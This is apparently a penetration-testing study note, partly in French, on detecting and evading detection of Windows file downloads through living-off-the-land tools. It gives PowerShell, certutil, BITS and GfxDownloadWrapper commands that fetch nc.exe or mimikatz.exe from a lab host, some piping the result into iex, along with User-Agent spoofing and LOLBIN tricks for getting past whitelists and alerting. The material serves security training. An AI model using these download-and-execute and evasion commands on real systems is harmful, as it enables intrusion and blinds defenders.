# Detection (A revoir)

## <mark style="color:red;">Détection des Commandes Malveillantes (LOTL)</mark>

Les attaquants utilisent des commandes légitimes pour faire des actions malveillantes, ce qui rend la détection plus difficile. Voici comment cela fonctionne et comment on peut les repérer.

### <mark style="color:blue;">**1. Obfuscation des Commandes**</mark>

Les attaquants peuvent modifier la présentation d'une commande pour qu'elle ne soit pas facilement repérable, par exemple en changeant la casse (`CMD.exe` au lieu de `cmd.exe`). Cela rend les listes noires (blacklists) inefficaces, car elles ne repèrent que les commandes dans une forme précise.

### <mark style="color:blue;">**2. Liste Blanche (Whitelisting)**</mark>

Une méthode plus efficace pour contrer cela est de créer une **liste blanche**. Cette liste inclut uniquement les commandes autorisées. Dès qu'une commande non autorisée est utilisée, elle est bloquée. C'est plus long à configurer, mais plus sûr.

### <mark style="color:blue;">**3. User-Agent (UA)**</mark>

Quand un programme ou un navigateur fait une requête sur Internet, il envoie un **User-Agent** qui dit au serveur quel logiciel fait la demande. Par exemple, quand tu utilises Chrome ou Firefox, ils envoient leur User-Agent spécifique pour se présenter.

Les attaquants peuvent utiliser des outils comme PowerShell ou cURL pour télécharger des fichiers malveillants, et ces outils envoient aussi un User-Agent. Si un User-Agent inhabituel apparaît dans un réseau (par exemple, un programme de transfert non standard), il pourrait s'agir d'une activité malveillante.

### <mark style="color:blue;">**4. Détection Basée sur les UA**</mark>

Les entreprises peuvent surveiller ces **User-Agents**. En créant une liste des User-Agents légitimes (ceux utilisés par des logiciels standards comme Windows Update), elles peuvent repérer les UA suspects qui pourraient indiquer un téléchargement ou une attaque malveillante.

***

<mark style="color:orange;">**Invoke-WebRequest - Client**</mark>

{% code fullWidth="true" %}
```powershell
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```
{% endcode %}

<mark style="color:orange;">**Invoke-WebRequest - Server**</mark>

{% code fullWidth="true" %}
```sh
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```
{% endcode %}

<mark style="color:orange;">**WinHttpRequest - Client**</mark>

{% code fullWidth="true" %}
```powershell
PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.ResponseText
```
{% endcode %}

<mark style="color:orange;">**WinHttpRequest - Server**</mark>

{% code fullWidth="true" %}
```shell-session
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```
{% endcode %}

**Msxml2 - Client**

{% code fullWidth="true" %}
```powershell
PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.responseText
```
{% endcode %}

<mark style="color:orange;">**Msxml2 - Server**</mark>

{% code fullWidth="true" %}
```powershell
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```
{% endcode %}

<mark style="color:orange;">**Certutil - Client**</mark>

{% code fullWidth="true" %}
```powershell
C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```
{% endcode %}

<mark style="color:orange;">**Certutil - Server**</mark>

{% code fullWidth="true" %}
```shell-session
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0
```
{% endcode %}

<mark style="color:orange;">**BITS - Client**</mark>

{% code fullWidth="true" %}
```powershell
PS C:\htb> Import-Module bitstransfer;
PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
PS C:\htb> $r=gc $env:temp\t;
PS C:\htb> rm $env:temp\t; 
PS C:\htb> iex $r
```
{% endcode %}

<mark style="color:orange;">**BITS - Server**</mark>

{% code fullWidth="true" %}
```shell-session
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
```
{% endcode %}

***

## <mark style="color:red;">Evading Detection</mark>

***

<mark style="color:orange;">**Changing User Agent**</mark>

If diligent administrators or defenders have blacklisted any of these User Agents, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contains a UserAgent parameter, which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome, Opera, or Safari. For example, if Chrome is used internally, setting this User Agent may make the request seem legitimate.

<mark style="color:orange;">**Listing out User Agents**</mark>

{% code title="Evading Detection" overflow="wrap" fullWidth="true" %}
```powershell
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```
{% endcode %}

Invoking Invoke-WebRequest to download nc.exe using a Chrome User Agent:

<mark style="color:orange;">**Request with Chrome User Agent**</mark>

{% code fullWidth="true" %}
```powershell
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```
{% endcode %}

```bash
mrroboteLiot@htb[/htb]$ nc -lvnp 80

listening on [any] 80 ...
connect to [10.10.10.32] from (UNKNOWN) [10.10.10.132] 51313
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive
```

***

### <mark style="color:red;">LOLBAS / GTFOBins</mark>

Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. In this case, an option may be to use a "LOLBIN" (living off the land binary), alternatively also known as "misplaced trust binaries." An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems and contains functionality to download configuration files periodically. This download functionality can be invoked as follows:

<mark style="color:green;">**Transferring File with GfxDownloadWrapper.exe**</mark>

{% code fullWidth="true" %}
```powershell
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```
{% endcode %}

Such a binary might be permitted to run by application whitelisting and be excluded from alerting. Other, more commonly available binaries are also available, and it is worth checking the [LOLBAS](https://lolbas-project.github.io/) project to find a suitable "file download" binary that exists in your environment. Linux's equivalent is the [GTFOBins](https://gtfobins.github.io/) project and is definitely also worth checking out. As of the time of writing, the GTFOBins project provides useful information on nearly 40 commonly installed binaries that can be used to perform file transfers.
